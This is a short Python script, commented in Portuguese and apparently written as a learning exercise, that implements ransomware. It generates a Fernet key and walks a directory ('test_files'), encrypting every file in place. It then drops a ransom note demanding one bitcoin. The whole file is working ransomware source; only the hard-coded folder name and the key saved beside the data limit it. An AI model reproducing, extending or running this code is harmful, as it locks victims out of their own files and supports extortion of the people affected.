from cryptography.fernet import Fernet
import os
#1. GERAR UMA CHAVE DE CRIPTOGRAFIA E SALVAR
def gerar_chave():
    chave = Fernet.generate_key() 
    with open("chave.key", "wb") as chave_files:
        chave_files.write(chave)
#2. CARREGAR A CHAVE SALVA
def carregar_chave():
    return open("chave.key", "rb").read()
#3. CRIPTOGRAFAR UM UNICO ARQUIVO
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)
#4. ENCONTRAR ARQUIVOS PARA ENCRIPTOGRAFAR
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista
#5. MENSAGEM DE RESGATE
def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!\n")
        f.write("ENVIA 1 BITCOIN PARA O ENDEREÇO X E O COMPROVANTE!\n")
        f.write("DEPOIS DISSO, ENVIAREMOS SEUS DADOS!\n")
#6. EXECUÇÃO PRINCIPAL
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("RANSOWARE EXECULTADO! ARQUIVOS CRIPTOGRAFADO!")
if __name__=="__main__":
    main()
